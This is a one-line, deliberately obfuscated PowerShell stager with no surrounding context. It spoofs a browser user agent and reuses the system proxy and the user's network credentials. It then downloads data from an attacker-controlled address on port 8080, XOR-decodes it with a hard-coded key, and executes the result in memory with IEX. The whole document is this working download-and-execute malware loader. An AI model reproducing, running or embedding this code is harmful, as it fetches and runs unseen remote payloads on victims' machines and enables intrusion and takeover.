
$Wc=NeW-ObJEct SysTeM.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERS.Add('User-Agent',$u);$wc.ProxY = [SysTEm.NeT.WEBREQuEst]::DEfauLTWEBPROxY;$wc.ProxY.CREdeNTIAls = [SyStEM.Net.CREDeNtiaLCAchE]::DEFaulTNEtWorkCREDentiALs;$K='21232f297a57a5a743894a0e4a801fc3';$I=0;[CHar[]]$b=([cHaR[]]($WC.DoWnLOadSTRINg("http://192.168.13.43:8080/index.asp")))|%{$_-BXOR$k[$i++%$K.LenGth]};IEX ($b-JOiN'')

